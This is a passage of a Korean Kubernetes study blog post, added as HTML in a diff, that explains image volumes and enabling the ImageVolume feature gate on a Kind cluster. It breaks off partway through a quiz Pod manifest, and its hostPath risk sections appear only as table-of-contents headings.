@@ -1,0 +1,1769 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.18.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="ko" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>[Kubernetes] Pod 볼륨 - 3. image 볼륨과 hostPath - Eraser’s StudyLog</title>
+<meta name="description" content="image 볼륨으로 컨테이너 이미지의 파일을 다른 컨테이너에 마운트하고, hostPath 볼륨의 동작과 위험성을 알아보자. ">
+
+
+  <meta name="author" content="Eraser">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="ko">
+<meta property="og:site_name" content="Eraser's StudyLog">
+<meta property="og:title" content="[Kubernetes] Pod 볼륨 - 3. image 볼륨과 hostPath">
+<meta property="og:url" content="https://sirzzang.github.io//kubernetes/Kubernetes-Pod-Volume-03-Image-Volume-HostPath/">
+
+
+  <meta property="og:description" content="image 볼륨으로 컨테이너 이미지의 파일을 다른 컨테이너에 마운트하고, hostPath 볼륨의 동작과 위험성을 알아보자. ">
+
+
+
+  <meta property="og:image" content="https://sirzzang.github.io//assets/images/blog-Dev.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2026-04-05T00:00:00+09:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://sirzzang.github.io//kubernetes/Kubernetes-Pod-Volume-03-Image-Volume-HostPath/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "https://sirzzang.github.io//"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Eraser's StudyLog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- Font Awesome -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+<script data-ad-client="ca-pub-1813896769045927" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+	
+	  <script type="text/x-mathjax-config">
+MathJax.Hub.Register.StartupHook('TeX Jax Ready', function () {
+  MathJax.InputJax.TeX.prefilterHooks.Add(function (data) {
+    data.math = data.math.replace(/^% <!\[CDATA\[/, '').replace(/%\]\]>$/, '');
+  });
+});
+</script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript">
+  MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "all" } } });
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/javascript" async
+  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+<!-- <script type="text/x-mathjax-config">
+window.MathJax = {
+  tex: {
+    tags: "ams",
+    inlineMath: [ ['$', '$'] ],
+    displayMath: [ ['$$', '$$'] ],
+    processEscapes: true
+  }
+};
+MathJax.Hub.Register.MessageHook("Math Processing Error",function (message) {
+	  alert("Math Processing Error: "+message[1]);
+	});
+MathJax.Hub.Register.MessageHook("TeX Jax - parse error",function (message) {
+	  alert("Math Processing Error: "+message[1]);
+	});
+</script>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Register.StartupHook('TeX Jax Ready', function () {
+  MathJax.InputJax.TeX.prefilterHooks.Add(function (data) {
+    data.math = data.math.replace(/^% <!\[CDATA\[/, '').replace(/%\]\]>$/, '');
+  });
+});
+</script>
+
+<script type="text/javascript" async
+  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+-->
+
+<!-- <script>
+window.MathJax = {
+  tex: {
+    tags: "ams",
+    inlineMath: [ ['$', '$'] ],
+    displayMath: [ ['$$', '$$'] ],
+    processEscapes: true
+  }
+};
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script> -->
+	
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Eraser's StudyLog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/Kubernetes/" >Kubernetes</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/Dev/" >Dev</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/CS/" >CS</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/AI/" >AI</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/Language/" >Language</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/articles/" >Articles</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/etc/" >Etc</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >All Posts</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">토글 메뉴</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+  <script type="text/x-mathjax-config">
+MathJax.Hub.Register.StartupHook('TeX Jax Ready', function () {
+  MathJax.InputJax.TeX.prefilterHooks.Add(function (data) {
+    data.math = data.math.replace(/^% <!\[CDATA\[/, '').replace(/%\]\]>$/, '');
+  });
+});
+</script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript">
+  MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "all" } } });
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/javascript" async
+  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+<!-- <script type="text/x-mathjax-config">
+window.MathJax = {
+  tex: {
+    tags: "ams",
+    inlineMath: [ ['$', '$'] ],
+    displayMath: [ ['$$', '$$'] ],
+    processEscapes: true
+  }
+};
+MathJax.Hub.Register.MessageHook("Math Processing Error",function (message) {
+	  alert("Math Processing Error: "+message[1]);
+	});
+MathJax.Hub.Register.MessageHook("TeX Jax - parse error",function (message) {
+	  alert("Math Processing Error: "+message[1]);
+	});
+</script>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Register.StartupHook('TeX Jax Ready', function () {
+  MathJax.InputJax.TeX.prefilterHooks.Add(function (data) {
+    data.math = data.math.replace(/^% <!\[CDATA\[/, '').replace(/%\]\]>$/, '');
+  });
+});
+</script>
+
+<script type="text/javascript" async
+  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+-->
+
+<!-- <script>
+window.MathJax = {
+  tex: {
+    tags: "ams",
+    inlineMath: [ ['$', '$'] ],
+    displayMath: [ ['$$', '$$'] ],
+    processEscapes: true
+  }
+};
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script> -->
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/blog-profile.jpg" alt="Eraser" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Eraser</h3>
+    
+    
+  </div>
+
+  <div style="margin-top: 1em;"></div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">팔로우</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="mailto:sir950123@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email</a></li>
+          
+        
+          
+            <li><a href="https://portfolio.sirzzang.org" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-briefcase" aria-hidden="true"></i> Portfolio</a></li>
+          
+        
+          
+            <li><a href="https://projectlog-eraser.tistory.com" rel="nofollow noopener noreferrer"><i class="fas fa-project-diagram" aria-hidden="true"></i> Projects</a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/sirzzang/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn</a></li>
+          
+        
+          
+            <li><a href="https://github.com/sirzzang" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="[Kubernetes] Pod 볼륨 - 3. image 볼륨과 hostPath">
+    <meta itemprop="description" content="image 볼륨으로 컨테이너 이미지의 파일을 다른 컨테이너에 마운트하고, hostPath 볼륨의 동작과 위험성을 알아보자.">
+    <meta itemprop="datePublished" content="2026-04-05T00:00:00+09:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+		  
+          <h1 id="page-title" class="page__title" itemprop="headline">[Kubernetes] Pod 볼륨 - 3. image 볼륨과 hostPath
+</h1>
+          
+          <p class="page__meta">
+            
+            <span class="page__date"><i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i> <time datetime="2026-04-05T00:00:00+09:00">2026년 04월 05일</time></span>
+            
+            
+              <span class="page__meta-sep"> · </span>
+              <i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  17 분 소요
+
+
+            
+          </p>
+          
+        </header>
+      
+	  
+		
+	
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              
+                <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On This Page</h4></header>
+                <ul class="toc__menu">
+  <li><a href="#tldr">TL;DR</a></li>
+  <li><a href="#image-볼륨">image 볼륨</a>
+    <ul>
+      <li><a href="#컨테이너-이미지를-파일-배포-매체로">컨테이너 이미지를 파일 배포 매체로</a></li>
+      <li><a href="#image-볼륨-타입-소개">image 볼륨 타입 소개</a>
+        <ul>
+          <li><a href="#동작-방식">동작 방식</a></li>
+          <li><a href="#주요-특징과-사용-사례">주요 특징과 사용 사례</a></li>
+        </ul>
+      </li>
+      <li><a href="#kind-클러스터에서-imagevolume-피처-게이트-활성화">Kind 클러스터에서 ImageVolume 피처 게이트 활성화</a></li>
+      <li><a href="#pod-매니페스트에서-image-볼륨-정의">Pod 매니페스트에서 image 볼륨 정의</a></li>
+      <li><a href="#새-pod-실행-및-검사">새 Pod 실행 및 검사</a></li>
+      <li><a href="#향후-전망-oci-artifacts와-oras">향후 전망: OCI Artifacts와 ORAS</a></li>
+    </ul>
+  </li>
+  <li><a href="#hostpath-볼륨">hostPath 볼륨</a>
+    <ul>
+      <li><a href="#노드와-pod의-경계를-넘는-볼륨">노드와 Pod의 경계를 넘는 볼륨</a></li>
+      <li><a href="#hostpath-소개">hostPath 소개</a>
+        <ul>
+          <li><a href="#위험성-경고">위험성 경고</a></li>
+        </ul>
+      </li>
+      <li><a href="#hostpath-사용-예제-node-explorer-pod">hostPath 사용 예제: node-explorer Pod</a></li>
+      <li><a href="#hostpath-위험성-체감">hostPath 위험성 체감</a>
+        <ul>
+          <li><a href="#사전-준비">사전 준비</a></li>
+          <li><a href="#노드-os-레벨-설정-조회조작">노드 OS 레벨 설정 조회/조작</a></li>
+          <li><a href="#다른-pod의-secret-탈취">다른 Pod의 Secret 탈취</a></li>
+          <li><a href="#kubelet-인증서로-api-서버-접근">kubelet 인증서로 API 서버 접근</a></li>
+          <li><a href="#host-crontab에-백도어-삽입">host crontab에 백도어 삽입</a></li>
+        </ul>
+      </li>
+      <li><a href="#hostpath-볼륨-타입-지정">hostPath 볼륨 타입 지정</a></li>
+    </ul>
+  </li>
+  <li><a href="#실무-관점-podsecurityadmission으로-hostpath-차단">실무 관점: PodSecurityAdmission으로 hostPath 차단</a></li>
+  <li><a href="#정리">정리</a></li>
+</ul>
+
+              
+          </nav>
+          <!-- right-sidebar ads -->
+          <nav class="toc-custom">
+          </nav>
+          </aside>
+        <p><em><a href="https://www.manning.com/books/kubernetes-in-action-second-edition">Kubernetes in Action 2nd Edition</a> 9장의 학습 내용을 기반으로 합니다.</em></p>
+
+<p><br /></p>
+
+<h1 id="tldr">TL;DR</h1>
+
+<ul>
+  <li><code class="highlighter-rouge">image</code> 볼륨은 OCI 이미지의 파일을 <strong>컨테이너를 실행하지 않고</strong> 다른 컨테이너에 읽기 전용으로 마운트하는 볼륨 타입이다. init 컨테이너 + emptyDir 조합을 대체할 수 있다</li>
+  <li><code class="highlighter-rouge">image</code> 볼륨은 ImageVolume 피처 게이트(Feature Gate)를 통해 활성화해야 하며, Kubernetes 1.33에서 beta로 승격되었다</li>
+  <li><code class="highlighter-rouge">hostPath</code> 볼륨은 노드의 파일 시스템 경로를 Pod에 마운트한다. 같은 노드의 Pod끼리만 동일 파일에 접근할 수 있다</li>
+  <li><code class="highlighter-rouge">hostPath</code>는 <strong>가장 위험한 볼륨 타입 중 하나</strong>다. Secret 탈취, kubelet 인증서 도용, 노드 백도어 삽입 등 심각한 보안 위협이 가능하므로, PodSecurityAdmission의 <code class="highlighter-rouge">restricted</code> 프로파일로 사용을 제한해야 한다</li>
+</ul>
+
+<p><br /></p>
+
+<h1 id="image-볼륨">image 볼륨</h1>
+
+<h2 id="컨테이너-이미지를-파일-배포-매체로">컨테이너 이미지를 파일 배포 매체로</h2>
+
+<p>컨테이너 이미지의 본래 목적은 어플리케이션 실행이지만, OCI 이미지 스펙은 단순히 “레이어로 구성된 파일 번들”일 뿐이다. 이 사실에 착안하면, 이미지를 <strong>파일 배포 매체</strong>로도 활용할 수 있다. <code class="highlighter-rouge">image</code> 볼륨은 바로 이 발상을 Kubernetes 네이티브하게 구현한 볼륨 타입이다.</p>
+
+<p>컨테이너는 사전에 준비된 데이터에 접근해야 하는 경우가 많다. <code class="highlighter-rouge">image</code> 볼륨은 OCI 이미지의 콘텐츠를 Pod 내 볼륨으로 직접 마운트하여 이 문제를 해결한다. Pod 생성 시 kubelet이 이미지를 pull하고 모든 콘텐츠를 볼륨으로 노출한다. (<a href="https://kubernetes.io/docs/concepts/storage/volumes/#image">Kubernetes 공식 문서: image Volume</a>) 이전 포스트에서 quiz Pod의 데이터베이스에 문제를 미리 채운 것이 대표적인 예이고, AI 모델 서빙 시 대용량 가중치 파일을 별도 패키징하는 것도 같은 맥락이다.</p>
+
+<p>기존에는 파일이 담긴 컨테이너 이미지를 빌드하고, init 컨테이너가 시작 시 emptyDir 볼륨에 복사한 뒤, 메인 컨테이너가 해당 볼륨을 마운트하는 방식을 사용했다. 하지만 <strong>“한 이미지의 파일을 다른 컨테이너에 전달”하는 단순한 목적치고는 과정이 지나치게 복잡하다</strong> — 별도 이미지 빌드, init 컨테이너 정의, 볼륨 설정, 복사 커맨드까지 필요하기 때문이다.</p>
+
+<p><code class="highlighter-rouge">image</code> 타입 볼륨을 사용하면 이 과정을 단순화할 수 있다.</p>
+
+<h2 id="image-볼륨-타입-소개">image 볼륨 타입 소개</h2>
+
+<p><code class="highlighter-rouge">image</code> 볼륨 타입은 OCI(Open Container Initiative) 이미지에 포함된 파일을 볼륨으로 노출하여, 같은 Pod 내 다른 컨테이너에 마운트할 수 있게 한다. <strong>컨테이너를 실행하지 않고도 컨테이너 이미지에 들어 있는 파일을 다른 컨테이너에 볼륨으로 직접 마운트</strong>할 수 있으며, 다른 컨테이너는 이 볼륨에서 <strong>읽기만 가능하고 쓰기는 불가능</strong>하다.</p>
+
+<p>여기서 “컨테이너 이미지”와 “OCI 이미지”의 개념 차이를 짚고 넘어가자.</p>
+
+<ul>
+  <li><strong>컨테이너 이미지</strong>: 좁은 의미로, “앱 + 런타임 + 라이브러리”를 패키징한 것이다. <code class="highlighter-rouge">docker run</code>으로 실행할 수 있는 이미지를 말한다. 예: <code class="highlighter-rouge">nginx:latest</code>, <code class="highlighter-rouge">mongo:7</code></li>
+  <li><strong>OCI 이미지</strong>: 넓은 의미로, OCI 스펙을 따르는 모든 이미지다. 앱이 아니어도 되고, 단순히 파일 몇 개를 레이어로 묶어놓은 것도 OCI 이미지다. 예: <code class="highlighter-rouge">FROM scratch</code>에 JS 파일 하나만 담은 이미지</li>
+</ul>
+
+<p>ImageVolume은 이미지를 <strong>실행하지 않고</strong> 파일만 꺼내는 것이기 때문에, 굳이 실행 가능한 “컨테이너 이미지”일 필요가 없다. OCI 스펙만 따르면 된다.</p>
+
+<h3 id="동작-방식">동작 방식</h3>
+
+<p><code class="highlighter-rouge">image</code> 볼륨은 이미지를 컨테이너로 “실행”하는 것이 아니라, <strong>이미지의 파일시스템(레이어)에서 파일만 꺼내서 다른 컨테이너에 볼륨으로 마운트하는 것</strong>이다.</p>
+
+<ul>
+  <li><strong>기존 방식</strong> (ImageVolume 없이):
+    <ul>
+      <li>initContainer가 이미지를 실행 → 스크립트로 파일을 emptyDir에 복사 → 다른 컨테이너가 emptyDir 마운트</li>
+      <li><code class="highlighter-rouge">insert-question.sh</code>처럼 Pod 생성 후 수동으로 데이터를 삽입</li>
+    </ul>
+  </li>
+  <li><strong>ImageVolume 방식</strong>: kubelet이 이미지를 pull → 레이어에서 파일 추출 → 바로 읽기 전용 볼륨으로 마운트</li>
+</ul>
+
+<p>ConfigMap이나 Secret처럼 파일을 제공하되, 그 소스가 컨테이너 이미지인 셈이다. ConfigMap/Secret이 etcd에서 파일을 꺼내서 볼륨으로 주는 것이라면, ImageVolume은 <strong>컨테이너 레지스트리에서 파일을 꺼내서 볼륨으로 준다</strong>고 이해하면 된다.</p>
+
+<h3 id="주요-특징과-사용-사례">주요 특징과 사용 사례</h3>
+
+<p>주요 특징을 정리하면 다음과 같다.</p>
+
+<ul>
+  <li>init 컨테이너 없이도 이미지에 담긴 파일을 볼륨으로 제공 가능</li>
+  <li>데이터를 이미지로 <strong>버전 관리</strong>하고 배포할 수 있음</li>
+  <li>읽기 전용으로 안전하게 마운트됨</li>
+  <li>Kubernetes 1.31에서 alpha(알파)로 도입, 1.33에서 beta(베타)로 승격 (ImageVolume 피처 게이트 필요). Kubernetes Feature Gate는 alpha → beta → GA(정식 출시) 순서로 졸업하며, beta부터 기본 활성화된다</li>
+</ul>
+
+<p>사용 사례는 다양하다.</p>
+
+<ol>
+  <li><strong>init 컨테이너 방식의 대안</strong> — 이미지에 담긴 파일을 다른 컨테이너에 전달할 때 복잡한 우회 과정 없이 직접 마운트</li>
+  <li><strong>정적 콘텐츠/에셋 배포</strong> — 웹 서버 컨테이너에 별도 이미지에 패키징된 정적 파일(HTML, CSS, JS 등)을 마운트</li>
+  <li><strong>바이너리/도구 주입</strong> — 디버깅 도구, CLI 바이너리 등을 별도 이미지에 담아 두고, 필요한 컨테이너에 볼륨으로 마운트</li>
+  <li><strong>ML 모델 가중치 배포</strong> — 모델 파일을 이미지로 패키징해 두고 서빙 컨테이너에 마운트</li>
+  <li><strong>설정/스키마 파일 분리</strong> — 어플리케이션 이미지와 설정 파일 이미지를 분리하여 독립적으로 버전 관리</li>
+</ol>
+
+<blockquote>
+  <p><strong>Note:</strong> 현재 시점에서는 이미지 아티팩트(Dockerfile로 빌드한 레이어 구조의 컨테이너 이미지)만 지원된다. 향후 모든 OCI 아티팩트를 지원할 계획이 있으며, 그렇게 되면 Dockerfile 없이 <code class="highlighter-rouge">oras push</code>로 파일을 바로 레지스트리에 올려 볼륨 소스로 사용할 수 있게 된다.</p>
+</blockquote>
+
+<h2 id="kind-클러스터에서-imagevolume-피처-게이트-활성화">Kind 클러스터에서 ImageVolume 피처 게이트 활성화</h2>
+
+<p><code class="highlighter-rouge">image</code> 볼륨 기능은 아직 기본적으로 활성화되어 있지 않으며, <strong>ImageVolume 피처 게이트</strong>를 통해 활성화해야 한다. 피처 게이트는 kubelet/API 서버 레벨의 설정이므로, 기존 클러스터에 적용할 수 없다. 새 클러스터를 만들 때 설정 파일에 명시해야 한다.</p>
+
+<blockquote>
+  <p><strong>Note:</strong> 피처 게이트(Feature Gate)는 Kubernetes에서 기능이 GA(Generally Available)되기 전에 기능을 숨겨두는 메커니즘이다. 클러스터 관리자가 명시적으로 활성화해야 하며, 활성화하지 않으면 해당 기능과 관련된 필드가 API에 보이고 설정할 수 있더라도 <strong>실제로 동작하지 않는다.</strong></p>
+</blockquote>
+
+<p>Kind 클러스터 설정 파일은 다음과 같다.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># kind-multi-node-with-image-volume.yaml</span>
+<span class="c1"># kubectl apply가 아니라 kind create cluster --config로 사용</span>
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Cluster</span>
+<span class="na">apiVersion</span><span class="pi">:</span> <span class="s">kind.x-k8s.io/v1alpha4</span>
+<span class="na">featureGates</span><span class="pi">:</span>
+  <span class="na">ImageVolume</span><span class="pi">:</span> <span class="no">true</span>
+<span class="na">nodes</span><span class="pi">:</span>
+<span class="pi">-</span> <span class="na">role</span><span class="pi">:</span> <span class="s">control-plane</span>
+<span class="pi">-</span> <span class="na">role</span><span class="pi">:</span> <span class="s">worker</span>
+<span class="pi">-</span> <span class="na">role</span><span class="pi">:</span> <span class="s">worker</span>
+</code></pre></div></div>
+
+<p>기존 클러스터를 삭제한 후, 이 설정 파일로 클러스터를 새로 생성한다. 새 클러스터는 control-plane 1개 + worker 2개의 멀티 노드 구성이며, ImageVolume 피처 게이트가 활성화된다.</p>
+
+<blockquote>
+  <p><strong>팁</strong>: 설정 파일 대신 heredoc으로 인라인 주입하는 것도 편리하다.</p>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kind create cluster <span class="nt">--image</span> kindest/node:v1.35.0 <span class="nt">--config</span> - <span class="o">&lt;&lt;</span><span class="no">EOF</span><span class="sh">
+kind: Cluster
+apiVersion: kind.x-k8s.io/v1alpha4
+featureGates:
+  ImageVolume: true
+nodes:
+- role: control-plane
+- role: worker
+- role: worker
+</span><span class="no">EOF
+</span></code></pre></div>  </div>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 기존에 설치된 kind 클러스터 삭제</span>
+kind delete cluster <span class="nt">--name</span> kind
+
+<span class="c"># 실행 결과</span>
+Deleting cluster <span class="s2">"kind"</span> ...
+Deleted nodes: <span class="o">[</span><span class="s2">"kind-control-plane"</span><span class="o">]</span>
+
+<span class="c"># 클러스터 새로 생성</span>
+kind create cluster <span class="nt">--config</span> kind-multi-node-with-image-volume.yaml
+
+<span class="c"># 실행 결과</span>
+Creating cluster <span class="s2">"kind"</span> ...
+ ✓ Ensuring node image <span class="o">(</span>kindest/node:v1.35.0<span class="o">)</span> 🖼
+ ✓ Preparing nodes 📦 📦 📦 
+ ✓ Writing configuration 📜
+ ✓ Starting control-plane 🕹️
+ ✓ Installing CNI 🔌
+ ✓ Installing StorageClass 💾
+ ✓ Joining worker nodes 🚜
+Set kubectl context to <span class="s2">"kind-kind"</span>
+
+<span class="c"># 새 클러스터 상태 확인</span>
+kubectl get nodes
+
+<span class="c"># 실행 결과</span>
+NAME                 STATUS   ROLES           AGE     VERSION
+kind-control-plane   Ready    control-plane   2m40s   v1.35.0
+kind-worker          Ready    &lt;none&gt;          2m30s   v1.35.0
+kind-worker2         Ready    &lt;none&gt;          2m30s   v1.35.0
+</code></pre></div></div>
+
+<p>피처 게이트가 정상 활성화되었는지 확인하려면, API 서버 파드의 args에서 <code class="highlighter-rouge">feature-gates</code>를 확인하면 된다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl describe pod <span class="nt">-n</span> kube-system kube-apiserver-kind-control-plane | <span class="nb">grep </span>feature-gates
+<span class="c">#       --feature-gates=ImageVolume=true</span>
+</code></pre></div></div>
+
+<h2 id="pod-매니페스트에서-image-볼륨-정의">Pod 매니페스트에서 image 볼륨 정의</h2>
+
+<p>quiz Pod에서 사용할 이미지를 먼저 살펴보자. <code class="highlighter-rouge">insert-questions.js</code> 파일 하나만 포함하는 이미지다.</p>
+
+<div class="language-docker highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Chapter09/quiz-questions/Dockerfile</span>
+<span class="k">FROM</span><span class="s"> scratch</span>
+<span class="k">COPY</span><span class="s"> insert-questions.js /</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">FROM scratch</code>에 파일 하나만 넣었기 때문에, 컨테이너 실행 시 아무것도 되지 않아 앱이라고 보기 어렵다. 하지만 OCI 스펙을 따르기 때문에 ImageVolume의 소스로 동작한다.</p>
+
+<p>quiz Pod 매니페스트를 업데이트하여, 기존의 init 컨테이너 + emptyDir 볼륨 대신 image 볼륨을 통해 MongoDB에 문제를 제공하도록 한다. 초기화 컨테이너가 더 이상 필요 없고, <strong>emptyDir 볼륨이 image 볼륨으로 대체</strong>되었다.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Chapter09/pod.quiz.imagevolume.yaml</span>
+<span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Pod</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">quiz</span>
+<span class="na">spec</span><span class="pi">:</span>
+  <span class="na">volumes</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">initdb</span>
+    <span class="na">image</span><span class="pi">:</span>                                <span class="c1"># image 볼륨으로 대체</span>
+      <span class="na">reference</span><span class="pi">:</span> <span class="s">luksa/quiz-questions:latest</span>
+      <span class="na">pullPolicy</span><span class="pi">:</span> <span class="s">Always</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">quiz-data</span>
+    <span class="na">emptyDir</span><span class="pi">:</span> <span class="pi">{}</span>
+  <span class="na">containers</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">quiz-api</span>
